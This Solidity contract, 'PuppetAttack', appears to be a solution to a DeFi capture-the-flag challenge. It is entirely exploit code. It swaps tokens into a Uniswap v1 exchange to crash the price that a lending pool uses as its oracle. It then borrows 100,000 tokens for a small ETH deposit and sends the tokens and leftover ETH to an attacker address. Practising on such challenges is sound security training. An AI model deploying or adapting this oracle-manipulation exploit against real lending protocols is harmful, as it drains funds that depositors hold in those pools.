// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface IUniswapExchange {
    function getEthToTokenInputPrice(
        uint256 eth_sold
    ) external view returns (uint256 tokens_bought);

    function getTokenToEthInputPrice(
        uint256 tokens_sold
    ) external view returns (uint256 eth_bought);

    function ethToTokenSwapInput(
        uint256 min_tokens,
        uint256 deadline
    ) external payable returns (uint256 tokens_bought);

    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256 eth_bought);
}

interface IPuppetPool {
    function calculateDepositRequired(
        uint256 amount
    ) external view returns (uint256);

    function borrow(uint256 amount, address recipient) external payable;

    function _computeOraclePrice() external view returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract PuppetAttack {
    IUniswapExchange private exchange;
    IPuppetPool private pool;
    address private attacker;
    address private helper;
    IERC20 private token;

    modifier OnlyHelper() {
        require(msg.sender == helper, "Only helper can call this function");
        _;
    }

    constructor(
        address exchangeAddress,
        address poolAddress,
        address attackerAddress,
        address helperAddress,
        address tokenAddress
    ) {
        exchange = IUniswapExchange(exchangeAddress);
        attacker = attackerAddress;
        helper = helperAddress;
        pool = IPuppetPool(poolAddress);
        token = IERC20(tokenAddress);
    }

    function attack() external payable OnlyHelper {
        console.log("token balance", token.balanceOf(address(this)));
        token.approve(address(exchange), 1000 * 10 ** 18);
        console.log("approved 1000*10**18");
        exchange.tokenToEthSwapInput(1000 * 10 ** 18, 1, block.timestamp);
        console.log("swapped 1000*10**18");
        uint256 requiredEth = pool.calculateDepositRequired(100000 * 10 ** 18);
        console.log("required eth", requiredEth);
        console.log("contract balance", address(this).balance);

        console.log(
            "contract balance minus requiredEth",
            address(this).balance - requiredEth
        );
        console.log("exchange eth balance", address(exchange).balance);
        console.log("exchange token balance", token.balanceOf(address(exchange)));
        console.log("ratio", address(exchange).balance * 10 ** 18 / token.balanceOf(address(exchange)));
        pool.borrow{value: requiredEth}(100000 * 10 ** 18, attacker);
        console.log("borrowed 100000*10**18");
        console.log("contract balance", address(this).balance);
        attacker.call{value: address(this).balance}("");
        console.log("token balance", token.balanceOf(address(this)));
    }

    receive() external payable {}
}
